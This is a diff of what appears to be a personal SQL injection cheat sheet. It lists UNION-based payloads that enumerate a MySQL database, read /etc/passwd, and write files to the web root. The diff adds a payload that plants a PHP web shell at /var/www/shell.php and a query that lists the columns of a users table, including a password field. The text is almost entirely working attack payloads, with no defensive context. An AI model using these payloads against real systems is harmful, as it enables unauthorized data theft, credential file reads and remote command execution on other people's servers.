@@ -13,11 +13,18 @@ a single quote
 'union select 1,2,3,@@version,5,6,7,8-- -
 'union select 1,2,3,user(),5,6,7,8-- -
 'union select 1,2,3,database(),5,6,7,8-- -
+'union select 1,2,3,table_name,5,6,7,8 from information_schema.tables-- -
+
 'union select 1,2,3,load_file('/etc/passwd'),5,6,7,8-- -
 'union select 1,2,3,'hello testing out file',5,6,7,8 into outfile '/var/www/test'-- - ( Insert File ) 
 'union select 1,2,3,load_file('/var/www/test'),5,6,7,8-- -  ( Check File )
+'union select null,null,null,"<?php system($_GET['cmd']);?>",5,6,7,8 into outfile '/var/www/shell.php'-- - (Insert File )
+'union select null,null,null,load_file('/var/www/shell.php'),5,6,7,8-- - ( Check File )
+
+
 'union select 1,2,3,column_name,5,6,7,8 from information_schema.columns where table_name='users'-- -
 'union select 1,2,3,group_concat(column_name),5,6,7,8 from information_schema.columns where table_name='users'-- -
+
 
 Return Result = user_id,first_name,last_name,email,pass,user_level,active,registration_date
 
